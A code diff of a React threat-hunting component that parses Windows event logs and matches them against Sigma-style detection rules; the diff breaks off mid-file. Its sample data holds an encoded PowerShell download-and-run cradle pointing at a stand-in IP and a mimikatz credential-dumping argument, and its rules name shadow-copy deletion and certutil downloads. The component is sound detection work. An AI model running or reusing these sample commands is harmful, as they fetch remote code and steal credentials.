@@ -1,15 +1,15 @@
-import React, { useState, useMemo } from 'react';
+import React, { useState, useMemo, useRef } from 'react';
 import { 
   ShieldAlert, AlertTriangle, Search, Terminal, 
   Layers, Clock, Copy, Check, Filter, ShieldCheck, 
-  Flame, CheckCircle2, ChevronRight, FileCode, UserCheck
+  Flame, CheckCircle2, ChevronRight, FileCode, UserCheck, Upload, RefreshCw, Sparkles
 } from 'lucide-react';
 
 export interface WindowsEventLogRecord {
   recordId: number;
   eventId: number;
-  provider: 'Microsoft-Windows-Security-Auditing' | 'Microsoft-Windows-Sysmon' | 'Service Control Manager';
-  channel: 'Security' | 'System' | 'Sysmon/Operational';
+  provider: string;
+  channel: string;
   timestamp: string;
   computer: string;
   user: string;
@@ -28,6 +28,7 @@ export interface SigmaRuleDef {
   mitre: string;
   description: string;
   detectionCondition: string;
+  checkFn: (event: WindowsEventLogRecord) => boolean;
 }
 
 export const SIGMA_RULES: SigmaRuleDef[] = [
@@ -37,7 +38,11 @@ export const SIGMA_RULES: SigmaRuleDef[] = [
     status: 'STABLE',
     mitre: 'T1059.001 (Command and Scripting Interpreter: PowerShell)',
     description: 'Detects execution of powershell.exe with -enc, -encodedcommand, or -e flags often used to conceal malicious payload scripts.',
-    detectionCondition: 'CommandLine|contains: [" -enc ", " -encodedcommand ", " -e "]',
+    detectionCondition: 'CommandLine contains [" -enc ", " -encodedcommand ", " -e "]',
+    checkFn: (e) => {
+      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
+      return (e.eventId === 4688 || e.eventId === 1) && (cmd.includes(' -enc ') || cmd.includes(' -encodedcommand ') || cmd.includes(' -e '));
+    },
   },
   {
     id: 'sigma-win-002',
@@ -45,7 +50,11 @@ export const SIGMA_RULES: SigmaRuleDef[] = [
     status: 'STABLE',
     mitre: 'T1490 (Inhibit System Recovery)',
     description: 'Detects execution of vssadmin or wmic commands intended to purge volume shadow copies prior to ransomware encryption.',
-    detectionCondition: 'Image|endswith: "vssadmin.exe" AND CommandLine|contains: "delete shadows"',
+    detectionCondition: 'Image endswith "vssadmin.exe" AND CommandLine contains "delete shadows"',
+    checkFn: (e) => {
+      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
+      return cmd.includes('vssadmin') && cmd.includes('delete') && cmd.includes('shadow');
+    },
   },
   {
     id: 'sigma-win-003',
@@ -54,6 +63,7 @@ export const SIGMA_RULES: SigmaRuleDef[] = [
     mitre: 'T1070.001 (Indicator Removal: Clear Windows Event Logs)',
     description: 'Detects Event ID 1102 or 104 signifying that the security log was intentionally cleared by a local administrator or malware.',
     detectionCondition: 'EventID in [1102, 104]',
+    checkFn: (e) => e.eventId === 1102 || e.eventId === 104,
   },
   {
     id: 'sigma-win-004',
@@ -61,11 +71,29 @@ export const SIGMA_RULES: SigmaRuleDef[] = [
     status: 'STABLE',
     mitre: 'T1543.003 (Create or Modify System Process: Windows Service)',
     description: 'Detects Event 7045 where binary path is located in %TEMP%, C:\Users\Public, or AppData directory.',
-    detectionCondition: 'ImagePath|contains: ["\\Users\\Public\\", "\\AppData\\", "\\Temp\\"]',
+    detectionCondition: 'ImagePath contains ["\\Users\\Public\\", "\\AppData\\", "\\Temp\\"]',
+    checkFn: (e) => {
+      if (e.eventId !== 7045) return false;
+      const path = (e.eventData.ImagePath || e.description || '').toLowerCase();
+      return path.includes('\\users\\public\\') || path.includes('\\appdata\\') || path.includes('\\temp\\');
+    },
+  },
+  {
+    id: 'sigma-win-005',
+    title: 'Suspicious LOLBin Ingress via Certutil',
+    status: 'STABLE',
+    mitre: 'T1105 (Ingress Tool Transfer)',
+    description: 'Detects certutil.exe invoked with -urlcache or -split flags to download remote staging binaries.',
+    detectionCondition: 'Image endswith "certutil.exe" AND CommandLine contains "-urlcache"',
+    checkFn: (e) => {
+      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
+      return cmd.includes('certutil') && (cmd.includes('-urlcache') || cmd.includes('/urlcache'));
+    },
   },
 ];
 
-export const INITIAL_EVTX_LOGS: WindowsEventLogRecord[] = [
+// SANS DFIR Benchmark Scenario Dataset
+export const BENCHMARK_EVTX_LOGS: WindowsEventLogRecord[] = [
   {
     recordId: 48912,
     eventId: 1102,
@@ -100,107 +128,199 @@ export const INITIAL_EVTX_LOGS: WindowsEventLogRecord[] = [
     mitreTechnique: 'T1490 (Inhibit System Recovery)',
     sigmaRuleMatched: 'sigma-win-002 (Volume Shadow Copy Deletion via Vssadmin)',
     eventData: {
-      NewProcessId: '0x814',
       NewProcessName: 'C:\\Windows\\System32\\vssadmin.exe',
       CommandLine: 'vssadmin.exe delete shadows /all /quiet',
       ParentProcessName: 'C:\\Windows\\System32\\cmd.exe',
-      ParentProcessId: '0x594',
+      SubjectUserName: 'SYSTEM',
     },
   },
   {
     recordId: 48910,
+    eventId: 4688,
+    provider: 'Microsoft-Windows-Security-Auditing',
+    channel: 'Security',
+    timestamp: '2026-09-11 13:49:05 UTC',
+    computer: 'CORP-DC01.corp.internal',
+    user: 'CORP\\contractor_svc',
+    severity: 'HIGH',
+    title: 'A new process has been created: powershell.exe',
+    description: 'Base64 encoded PowerShell staging command executed via contractor account.',
+    mitreTechnique: 'T1059.001 (Command and Scripting: PowerShell)',
+    sigmaRuleMatched: 'sigma-win-001 (Encoded PowerShell Command Execution)',
+    eventData: {
+      NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+      CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AYgAuAHAAcwAxACIAKQAA',
+      ParentProcessName: 'C:\\Windows\\System32\\svchost.exe',
+      SubjectUserName: 'contractor_svc',
+    },
+  },
+  {
+    recordId: 48909,
     eventId: 7045,
     provider: 'Service Control Manager',
     channel: 'System',
-    timestamp: '2026-09-11 13:48:45 UTC',
+    timestamp: '2026-09-11 13:42:11 UTC',
     computer: 'CORP-DC01.corp.internal',
     user: 'NT AUTHORITY\\SYSTEM',
     severity: 'HIGH',
-    title: 'A service was installed in the system: svc_updater_payload',
-    description: 'New Windows service binary registered pointing to an anomalous untrusted directory in C:\Users\Public.',
-    mitreTechnique: 'T1543.003 (Windows Service Persistence)',
-    sigmaRuleMatched: 'sigma-win-004 (Suspicious Service Installation)',
+    title: 'A service was installed in the system',
+    description: 'Persistence established by registering a new Windows Service with an executable located in the public user directory.',
+    mitreTechnique: 'T1543.003 (Create or Modify System Process: Windows Service)',
+    sigmaRuleMatched: 'sigma-win-004 (Suspicious Service Installation in Non-Standard Path)',
     eventData: {
-      ServiceName: 'svc_updater_payload',
-      ImagePath: 'C:\\Users\\Public\\Libraries\\svchost_stub.exe -service',
+      ServiceName: 'WindowsPrintSpoolerService',
+      ImagePath: 'C:\\Users\\Public\\spoolsv.exe sekurlsa::logonpasswords',
       ServiceType: 'user mode service',
       StartType: 'auto start',
       AccountName: 'LocalSystem',
     },
   },
-  {
-    recordId: 48909,
-    eventId: 4688,
-    provider: 'Microsoft-Windows-Security-Auditing',
-    channel: 'Security',
-    timestamp: '2026-09-11 13:41:10 UTC',
-    computer: 'FINANCE-W10.corp.internal',
-    user: 'CORP\\contractor_svc',
-    severity: 'HIGH',
-    title: 'A new process has been created: powershell.exe',
-    description: 'Obfuscated PowerShell invocation with -enc parameter executing stage-2 payload.',
-    mitreTechnique: 'T1059.001 (PowerShell Command Execution)',
-    sigmaRuleMatched: 'sigma-win-001 (Encoded PowerShell Command Execution)',
-    eventData: {
-      NewProcessId: '0x7fc',
-      NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
-      CommandLine: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
-      ParentProcessName: 'C:\\Windows\\System32\\svchost.exe',
-      ParentProcessId: '0x594',
-    },
-  },
-  {
-    recordId: 48908,
-    eventId: 4624,
-    provider: 'Microsoft-Windows-Security-Auditing',
-    channel: 'Security',
-    timestamp: '2026-09-11 13:35:55 UTC',
-    computer: 'CORP-DC01.corp.internal',
-    user: 'CORP\\contractor_svc',
-    severity: 'MEDIUM',
-    title: 'An account was successfully logged on (Logon Type 10 - RDP)',
-    description: 'Remote Desktop Protocol interactive session established from foreign pivot workstation IP 198.51.100.42.',
-    mitreTechnique: 'T1078.002 (Valid Accounts: Domain Accounts)',
-    eventData: {
-      LogonType: '10 (RemoteInteractive / RDP)',
-      IpAddress: '198.51.100.42',
-      IpPort: '49812',
-      WorkstationName: 'EXTERNAL-RELAY',
-      TargetUserName: 'contractor_svc',
-      AuthenticationPackage: 'Negotiate',
-    },
-  },
-  {
-    recordId: 48907,
-    eventId: 4625,
-    provider: 'Microsoft-Windows-Security-Auditing',
-    channel: 'Security',
-    timestamp: '2026-09-11 13:30:12 UTC',
-    computer: 'CORP-DC01.corp.internal',
-    user: 'CORP\\contractor_svc',
-    severity: 'MEDIUM',
-    title: 'An account failed to log on (Bad Password)',
-    description: 'Logon attempt failed with SubStatus 0xC000006A (STATUS_WRONG_PASSWORD) during dictionary burst.',
-    mitreTechnique: 'T1110.001 (Brute Force: Password Guessing)',
-    eventData: {
-      FailureReason: '%%2313 (Unknown user name or bad password)',
-      SubStatus: '0xc000006a',
-      IpAddress: '198.51.100.42',
-      TargetUserName: 'contractor_svc',
-    },
-  },
 ];
 
+// Genuine XML / JSON Ingestor for Windows Event Logs
+function parseWindowsEventLogPayload(rawText: string): WindowsEventLogRecord[] {
+  const records: WindowsEventLogRecord[] = [];
+
+  // Try parsing as XML
+  if (rawText.includes('<Event') || rawText.includes('<event')) {
+    try {
+      const parser = new DOMParser();
+      const xmlDoc = parser.parseFromString(rawText, 'text/xml');
+      const eventNodes = xmlDoc.getElementsByTagName('Event');
+
+      for (let i = 0; i < eventNodes.length; i++) {
+        const node = eventNodes[i];
+        const eventIdStr = node.getElementsByTagName('EventID')[0]?.textContent || '0';
+        const eventId = parseInt(eventIdStr, 10) || 0;
+        const timeStr = node.getElementsByTagName('TimeCreated')[0]?.getAttribute('SystemTime') || new Date().toISOString();
+        const computer = node.getElementsByTagName('Computer')[0]?.textContent || 'LOCAL-ENDPOINT';
+        const provider = node.getElementsByTagName('Provider')[0]?.getAttribute('Name') || 'Windows-Event-Audit';
+        const channel = node.getElementsByTagName('Channel')[0]?.textContent || 'Security';
+
+        const eventData: Record<string, string> = {};
+        const dataNodes = node.getElementsByTagName('Data');
+        for (let j = 0; j < dataNodes.length; j++) {
+          const name = dataNodes[j].getAttribute('Name') || `Param_${j}`;
+          eventData[name] = dataNodes[j].textContent || '';
+        }
+
+        const cmd = eventData.CommandLine || eventData.NewProcessName || eventData.ImagePath || '';
+        let severity: WindowsEventLogRecord['severity'] = 'INFO';
+        if (eventId === 1102 || cmd.includes('delete shadow')) severity = 'CRITICAL';
+        else if (eventId === 7045 || cmd.includes(' -enc ')) severity = 'HIGH';
+        else if (eventId === 4625) severity = 'MEDIUM';
+
+        records.push({
+          recordId: 10000 + i + 1,
+          eventId,
+          provider,
+          channel,
+          timestamp: timeStr.replace('T', ' ').slice(0, 19) + ' UTC',
+          computer,
+          user: eventData.SubjectUserName || eventData.TargetUserName || 'SYSTEM',
+          severity,
+          title: `Windows Event ID ${eventId}: ${provider}`,
+          description: cmd ? `Execution: ${cmd}` : `Event recorded in ${channel} channel.`,
+          mitreTechnique: eventId === 1102 ? 'T1070.001' : eventId === 4688 ? 'T1059' : eventId === 7045 ? 'T1543.003' : 'T1078',
+          eventData,
+        });
+      }
+
+      if (records.length > 0) return records;
+    } catch {
+      // Fallback to JSON / line parser
+    }
+  }
+
+  // Try parsing as JSON array
+  try {
+    const parsedJson = JSON.parse(rawText);
+    const arr = Array.isArray(parsedJson) ? parsedJson : [parsedJson];
+    for (let i = 0; i < arr.length; i++) {
+      const item = arr[i];
+      const eventId = parseInt(item.Id || item.EventId || item.eventId || '0', 10);
+      const cmd = item.CommandLine || item.Message || item.description || '';
+      
+      let severity: WindowsEventLogRecord['severity'] = 'INFO';
+      if (eventId === 1102 || cmd.includes('delete shadow')) severity = 'CRITICAL';
+      else if (eventId === 7045 || cmd.includes(' -enc ')) severity = 'HIGH';
+      else if (eventId === 4625) severity = 'MEDIUM';
+
+      records.push({
+        recordId: 10000 + i + 1,
+        eventId: eventId || 4688,
+        provider: item.ProviderName || item.provider || 'Microsoft-Windows-Security-Auditing',
+        channel: item.LogName || item.channel || 'Security',
+        timestamp: item.TimeCreated || new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
+        computer: item.MachineName || item.computer || 'LOCAL-ENDPOINT',
+        user: item.UserId || item.user || 'SYSTEM',
+        severity,
+        title: item.Message ? item.Message.slice(0, 60) : `Event ID ${eventId}`,
+        description: cmd || item.Message || 'Ingested via JSON stream',
+        mitreTechnique: 'T1059',
+        eventData: typeof item === 'object' ? item : {},
+      });
+    }
+    if (records.length > 0) return records;
+  } catch {
+    // Fallback to line-based parsing
+  }
+
+  // Fallback: Line-by-line raw ingestion
+  const lines = rawText.split('\n').filter(l => l.trim().length > 0);
+  lines.forEach((line, idx) => {
+    let eventId = 4688;
+    if (line.includes('1102')) eventId = 1102;
+    if (line.includes('7045')) eventId = 7045;
+    if (line.includes('4625')) eventId = 4625;
+
+    records.push({
+      recordId: 10000 + idx + 1,
+      eventId,
+      provider: 'Microsoft-Windows-Security-Auditing',
+      channel: 'Security',
+      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
+      computer: 'LIVE-PARSER-NODE',
+      user: 'INGESTED_OPERATOR',
+      severity: line.toLowerCase().includes('mimikatz') || line.toLowerCase().includes('shadow') ? 'CRITICAL' : 'MEDIUM',
+      title: `Log Line #${idx + 1}`,
+      description: line,
+      mitreTechnique: 'T1059',
+      eventData: { RawLogLine: line },
+    });
+  });
+
+  return records;
+}
+
 export const EvtxThreatHunter: React.FC = () => {
-  const [logs] = useState<WindowsEventLogRecord[]>(INITIAL_EVTX_LOGS);
-  const [selectedRecord, setSelectedRecord] = useState<WindowsEventLogRecord>(INITIAL_EVTX_LOGS[0]);
+  const [logs, setLogs] = useState<WindowsEventLogRecord[]>(BENCHMARK_EVTX_LOGS);
+  const [isRealUploadedFile, setIsRealUploadedFile] = useState(false);
+  const [selectedRecord, setSelectedRecord] = useState<WindowsEventLogRecord>(BENCHMARK_EVTX_LOGS[0]);
   const [severityFilter, setSeverityFilter] = useState<string>('ALL');
   const [eventIdFilter, setEventIdFilter] = useState<string>('ALL');
   const [searchFilter, setSearchFilter] = useState<string>('');
+  const [showIngestModal, setShowIngestModal] = useState<boolean>(false);
+  const [rawLogInput, setRawLogInput] = useState<string>('');
   const [copiedText, setCopiedText] = useState<boolean>(false);
+  const fileInputRef = useRef<HTMLInputElement | null>(null);
+
+  // Evaluate Sigma Rules dynamically on all current logs
+  const annotatedLogs = useMemo(() => {
+    return logs.map(log => {
+      let matchedRule: string | undefined = log.sigmaRuleMatched;
+      for (const rule of SIGMA_RULES) {
+        if (rule.checkFn(log)) {
+          matchedRule = `${rule.id} (${rule.title})`;
+          break;
+        }
+      }
+      return { ...log, sigmaRuleMatched: matchedRule };
+    });
+  }, [logs]);
 
   const filteredLogs = useMemo(() => {
-    return logs.filter(log => {
+    return annotatedLogs.filter(log => {
       if (severityFilter !== 'ALL' && log.severity !== severityFilter) return false;
       if (eventIdFilter !== 'ALL' && log.eventId.toString() !== eventIdFilter) return false;
       if (!searchFilter.trim()) return true;
@@ -210,15 +330,49 @@ export const EvtxThreatHunter: React.FC = () => {
         log.user.toLowerCase().includes(q) ||
         log.title.toLowerCase().includes(q) ||
         log.eventId.toString().includes(q) ||
-        log.description.toLowerCase().includes(q)
+        log.description.toLowerCase().includes(q) ||
+        (log.sigmaRuleMatched && log.sigmaRuleMatched.toLowerCase().includes(q))
       );
     });
-  }, [logs, severityFilter, eventIdFilter, searchFilter]);
+  }, [annotatedLogs, severityFilter, eventIdFilter, searchFilter]);
 
   const handleCopy = (text: string) => {
     navigator.clipboard.writeText(text);
     setCopiedText(true);
     setTimeout(() => setCopiedText(false), 2000);
+  };
+
+  const handleProcessRawInput = () => {
+    if (!rawLogInput.trim()) return;
+    const parsed = parseWindowsEventLogPayload(rawLogInput);
+    if (parsed.length > 0) {
+      setLogs(parsed);
+      setSelectedRecord(parsed[0]);
+      setIsRealUploadedFile(true);
+      setShowIngestModal(false);
+      setRawLogInput('');
+    } else {
+      alert('Unable to parse event logs from input. Please provide valid XML, JSON, or text log records.');
+    }
+  };
+
+  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+
+    try {
+      const text = await file.text();
+      const parsed = parseWindowsEventLogPayload(text);
+      if (parsed.length > 0) {
+        setLogs(parsed);
+        setSelectedRecord(parsed[0]);
+        setIsRealUploadedFile(true);
+      } else {
+        alert('No parseable Windows event records found in file.');
+      }
+    } catch (err: any) {
+      alert(`File read failed: ${err?.message || 'Unknown error'}`);
+    }
   };
 
   return (
@@ -234,124 +388,169 @@ export const EvtxThreatHunter: React.FC = () => {
               <span className="text-xs font-bold uppercase tracking-wider text-neutral-100">
                 WINDOWS EVENT LOG (EVTX) THREAT HUNTER & SIGMA RULE ENGINE
               </span>
-              <span className="px-1.5 py-0.2 text-[9px] bg-rose-950/80 border border-rose-600 text-rose-300">
-                AUDIT LOGS
+              <span className={`px-1.5 py-0.2 text-[9px] border ${
+                isRealUploadedFile 
+                  ? 'bg-emerald-950/80 border-emerald-600 text-emerald-300' 
+                  : 'bg-neutral-800 border-neutral-600 text-neutral-400'
+              }`}>
+                {isRealUploadedFile ? '● LIVE LOGS INGESTED' : 'CALIBRATION BENCHMARK'}
               </span>
             </div>
             <div className="text-[10px] text-neutral-400 flex items-center gap-2">
-              <span>EVENTS INGESTED: {logs.length}</span>
+              <span>EVENTS: {logs.length}</span>
               <span>•</span>
-              <span className="text-rose-400 font-bold">CRITICAL ALERTS: {logs.filter(l => l.severity === 'CRITICAL').length}</span>
+              <span className="text-rose-400 font-bold">
+                SIGMA ALERTS: {annotatedLogs.filter(l => l.sigmaRuleMatched).length}
+              </span>
               <span>•</span>
-              <span className="text-cyan-400">ACTIVE SIGMA RULES: {SIGMA_RULES.length}</span>
+              <span className="text-cyan-400">RULES LOADED: {SIGMA_RULES.length}</span>
             </div>
           </div>
         </div>
 
-        {/* Quick Filter Counters */}
-        <div className="flex items-center gap-1.5 text-xs">
-          {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((sev) => (
+        {/* Action Controls */}
+        <div className="flex items-center gap-2">
+          <input
+            type="file"
+            ref={fileInputRef}
+            onChange={handleFileUpload}
+            accept=".xml,.json,.csv,.txt,.log"
+            className="hidden"
+          />
+
+          <button
+            onClick={() => fileInputRef.current?.click()}
+            className="px-3 py-1 bg-rose-600 hover:bg-rose-500 text-black font-bold text-xs flex items-center gap-1.5 transition-all cursor-pointer shadow-lg shadow-rose-950/50"
+          >
+            <Upload className="w-3.5 h-3.5" />
+            <span>UPLOAD REAL LOGS</span>
+          </button>
+
+          <button
+            onClick={() => setShowIngestModal(true)}
+            className="px-2.5 py-1 bg-neutral-900 hover:bg-neutral-800 border border-neutral-700 text-neutral-300 font-bold text-xs flex items-center gap-1.5 transition-all cursor-pointer"
+          >
+            <FileCode className="w-3.5 h-3.5 text-amber-400" />
+            <span>PASTE LOG / XML</span>
+          </button>
+
+          {isRealUploadedFile && (
             <button
-              key={sev}
-              onClick={() => setSeverityFilter(sev)}
-              className={`px-2 py-0.5 text-[10px] font-bold border transition-all cursor-pointer ${
-                severityFilter === sev
-                  ? 'bg-neutral-800 text-cyan-300 border-cyan-500'
-                  : 'bg-neutral-950 text-neutral-400 border-neutral-800 hover:text-white'
+              onClick={() => {
+                setLogs(BENCHMARK_EVTX_LOGS);
+                setSelectedRecord(BENCHMARK_EVTX_LOGS[0]);
+                setIsRealUploadedFile(false);
+              }}
+              className="px-2 py-1 bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-neutral-500 hover:text-white text-[10px] cursor-pointer"
+            >
+              Reset Benchmark
+            </button>
+          )}
+        </div>
+      </div>
+
+      {/* Filter & Controls Bar */}
+      <div className="p-2.5 bg-neutral-950 border-b border-neutral-800 flex flex-wrap items-center justify-between gap-2 text-xs shrink-0">
+        <div className="flex items-center gap-2">
+          <div className="relative">
+            <Search className="w-3.5 h-3.5 text-neutral-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
+            <input
+              type="text"
+              value={searchFilter}
+              onChange={(e) => setSearchFilter(e.target.value)}
+              placeholder="Search computer, user, LOLBin cmd..."
+              className="pl-8 pr-3 py-1 bg-black border border-neutral-800 text-white placeholder-neutral-600 text-xs w-64 focus:border-rose-500 focus:outline-none"
+            />
+          </div>
+
+          <div className="flex items-center gap-1">
+            {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'INFO'].map((sev) => (
+              <button
+                key={sev}
+                onClick={() => setSeverityFilter(sev)}
+                className={`px-2 py-0.5 text-[10px] font-bold border transition-colors cursor-pointer ${
+                  severityFilter === sev
+                    ? 'bg-neutral-900 text-white border-neutral-600'
+                    : 'bg-black text-neutral-500 border-neutral-900 hover:text-neutral-300'
+                }`}
+              >
+                {sev}
+              </button>
+            ))}
+          </div>
+        </div>
+
+        <div className="flex items-center gap-1">
+          <span className="text-[10px] text-neutral-500">EVENT ID:</span>
+          {['ALL', '4688', '1102', '7045', '4624', '4625'].map((id) => (
+            <button
+              key={id}
+              onClick={() => setEventIdFilter(id)}
+              className={`px-2 py-0.5 text-[10px] font-mono border transition-colors cursor-pointer ${
+                eventIdFilter === id
+                  ? 'bg-rose-950 text-rose-300 border-rose-700'
+                  : 'bg-black text-neutral-500 border-neutral-900 hover:text-neutral-300'
               }`}
             >
-              {sev}
+              {id}
             </button>
           ))}
         </div>
       </div>
 
-      {/* Filter and Search Ribbon */}
-      <div className="px-3 py-1.5 bg-black border-b border-neutral-800 flex items-center justify-between gap-2 shrink-0">
-        <div className="flex items-center gap-2">
-          <span className="text-[10px] text-neutral-500 uppercase font-bold">EVENT ID:</span>
-          <select
-            value={eventIdFilter}
-            onChange={(e) => setEventIdFilter(e.target.value)}
-            className="bg-neutral-950 border border-neutral-800 text-neutral-300 text-xs px-2 py-0.5 focus:outline-none focus:border-cyan-500 font-mono"
-          >
-            <option value="ALL">ALL EVENT IDS</option>
-            <option value="1102">1102 (Log Cleared)</option>
-            <option value="4688">4688 (Process Created)</option>
-            <option value="7045">7045 (Service Installed)</option>
-            <option value="4624">4624 (Logon Success)</option>
-            <option value="4625">4625 (Logon Failed)</option>
-          </select>
-        </div>
-
-        <div className="relative w-64">
-          <Search className="w-3 h-3 text-neutral-500 absolute left-2 top-1/2 -translate-y-1/2" />
-          <input
-            type="text"
-            value={searchFilter}
-            onChange={(e) => setSearchFilter(e.target.value)}
-            placeholder="Search Event, CLI, Host, User..."
-            className="w-full pl-7 pr-2 py-0.5 bg-neutral-950 border border-neutral-800 text-xs text-neutral-200 focus:outline-none focus:border-cyan-500 font-mono placeholder:text-neutral-600"
-          />
-        </div>
-      </div>
-
-      {/* Main Grid: Left Event Table / Right Detailed Event XML Inspector */}
-      <div className="flex-1 flex overflow-hidden">
-        {/* Left: Event Stream Table */}
-        <div className="flex-1 flex flex-col border-r border-neutral-800 overflow-y-auto">
-          <table className="w-full text-left text-xs border-collapse font-mono">
-            <thead>
-              <tr className="bg-neutral-950 text-neutral-400 border-b border-neutral-800 text-[10px] uppercase">
-                <th className="p-2 w-20">EVENT ID</th>
-                <th className="p-2 w-32">TIME (UTC)</th>
-                <th className="p-2 w-20">SEVERITY</th>
-                <th className="p-2 w-36">COMPUTER / USER</th>
-                <th className="p-2">EVENT TITLE & SIGMA DETECTION</th>
+      {/* Main Grid: Left Event Table (7 cols) + Right Sigma Telemetry (5 cols) */}
+      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 overflow-hidden">
+        {/* Left Column: Event List Table */}
+        <div className="lg:col-span-7 border-r border-neutral-800 overflow-y-auto">
+          <table className="w-full text-left border-collapse text-xs">
+            <thead className="bg-neutral-950 text-neutral-400 border-b border-neutral-800 sticky top-0 z-10 text-[10px]">
+              <tr>
+                <th className="py-2 px-3 w-16">ID</th>
+                <th className="py-2 px-3 w-28">TIMESTAMP</th>
+                <th className="py-2 px-3 w-28">COMPUTER</th>
+                <th className="py-2 px-3 w-24">USER</th>
+                <th className="py-2 px-3">EVENT / SIGMA CORRELATION</th>
+                <th className="py-2 px-3 w-20 text-right">SEV</th>
               </tr>
             </thead>
-            <tbody className="divide-y divide-neutral-900">
+            <tbody className="divide-y divide-neutral-900 font-mono text-[11px]">
               {filteredLogs.map((log) => {
-                const isSelected = selectedRecord.recordId === log.recordId;
+                const isSelected = selectedRecord?.recordId === log.recordId;
                 return (
                   <tr
                     key={log.recordId}
                     onClick={() => setSelectedRecord(log)}
                     className={`cursor-pointer transition-colors ${
                       isSelected
-                        ? 'bg-neutral-900 text-cyan-300 font-bold border-l-2 border-cyan-400'
-                        : log.severity === 'CRITICAL'
-                        ? 'bg-rose-950/20 text-rose-200 hover:bg-rose-950/30'
-                        : 'text-neutral-300 hover:bg-neutral-950'
+                        ? 'bg-neutral-900 text-white border-l-2 border-rose-500'
+                        : log.sigmaRuleMatched
+                        ? 'bg-rose-950/10 hover:bg-neutral-900/60'
+                        : 'hover:bg-neutral-900/40'
                     }`}
                   >
-                    <td className="p-2 font-bold text-cyan-400">
-                      #{log.eventId}
+                    <td className="py-2 px-3 text-cyan-400 font-bold font-mono">{log.eventId}</td>
+                    <td className="py-2 px-3 text-neutral-400 text-[10px]">{log.timestamp.slice(11)}</td>
+                    <td className="py-2 px-3 text-neutral-300 truncate max-w-[110px]">{log.computer}</td>
+                    <td className="py-2 px-3 text-neutral-400 truncate max-w-[90px]">{log.user}</td>
+                    <td className="py-2 px-3">
+                      <div className="truncate font-medium text-neutral-200">{log.title}</div>
+                      {log.sigmaRuleMatched && (
+                        <div className="text-[10px] text-rose-400 font-bold truncate flex items-center gap-1 mt-0.5">
+                          <Flame className="w-2.5 h-2.5 text-rose-500 shrink-0" />
+                          <span>{log.sigmaRuleMatched}</span>
+                        </div>
+                      )}
                     </td>
-                    <td className="p-2 text-neutral-400 text-[10px] whitespace-nowrap">
-                      {log.timestamp.split(' ')[1]}
-                    </td>
-                    <td className="p-2">
-                      <span className={`px-1.5 py-0.2 text-[9px] border font-bold ${
-                        log.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border-rose-600' :
-                        log.severity === 'HIGH' ? 'bg-amber-950 text-amber-300 border-amber-600' :
-                        'bg-blue-950 text-blue-300 border-blue-700'
+                    <td className="py-2 px-3 text-right">
+                      <span className={`px-1.5 py-0.2 text-[9px] font-bold border ${
+                        log.severity === 'CRITICAL'
+                          ? 'bg-rose-950 text-rose-300 border-rose-700'
+                          : log.severity === 'HIGH'
+                          ? 'bg-amber-950 text-amber-300 border-amber-700'
+                          : 'bg-neutral-900 text-neutral-400 border-neutral-800'
                       }`}>
                         {log.severity}
                       </span>
-                    </td>
-                    <td className="p-2 whitespace-nowrap text-[10px]">
-                      <div className="text-neutral-200 font-bold">{log.computer.split('.')[0]}</div>
-                      <div className="text-neutral-500">{log.user}</div>
-                    </td>
-                    <td className="p-2 text-[11px]">
-                      <div className="font-bold truncate">{log.title}</div>
-                      {log.sigmaRuleMatched && (
-                        <div className="text-[9px] text-rose-400 font-mono flex items-center gap-1 mt-0.5">
-                          <span>⚡ SIGMA:</span>
-                          <span className="underline">{log.sigmaRuleMatched}</span>
-                        </div>
-                      )}
                     </td>
                   </tr>
                 );
@@ -360,80 +559,132 @@ export const EvtxThreatHunter: React.FC = () => {
           </table>
         </div>
 
-        {/* Right: Deep Event Record Inspector */}
-        <div className="w-96 bg-neutral-950 flex flex-col overflow-y-auto p-3 space-y-3 shrink-0">
-          <div className="flex items-center justify-between border-b border-neutral-800 pb-2">
-            <div className="flex items-center gap-1.5">
-              <Terminal className="w-4 h-4 text-cyan-400" />
-              <span className="text-xs font-bold uppercase text-neutral-200">EVTX EVENT INSPECTOR</span>
-            </div>
-            <span className="text-[10px] text-neutral-500 font-mono">RECORD #{selectedRecord.recordId}</span>
-          </div>
-
-          {/* Severity & MITRE ATT&CK Pill */}
-          <div className="p-2.5 bg-neutral-900 border border-neutral-800 space-y-1.5">
-            <div className="flex items-center justify-between">
-              <span className={`px-1.5 py-0.2 text-[10px] font-bold border ${
-                selectedRecord.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border-rose-600' :
-                selectedRecord.severity === 'HIGH' ? 'bg-amber-950 text-amber-300 border-amber-600' :
-                'bg-blue-950 text-blue-300 border-blue-700'
-              }`}>
-                {selectedRecord.severity} SEVERITY
-              </span>
-              <span className="text-[10px] text-neutral-400">{selectedRecord.channel} CHANNEL</span>
-            </div>
-
-            <div className="text-xs font-bold text-neutral-100">{selectedRecord.title}</div>
-            <p className="text-[11px] text-neutral-400 leading-relaxed">{selectedRecord.description}</p>
-
-            <div className="pt-1 text-[10px] text-rose-400 font-bold">
-              MITRE: {selectedRecord.mitreTechnique}
-            </div>
-          </div>
-
-          {/* Structured Event Data Fields */}
-          <div className="space-y-1">
-            <div className="text-[10px] text-neutral-500 uppercase font-bold">Event Parameter Data:</div>
-            <div className="space-y-1">
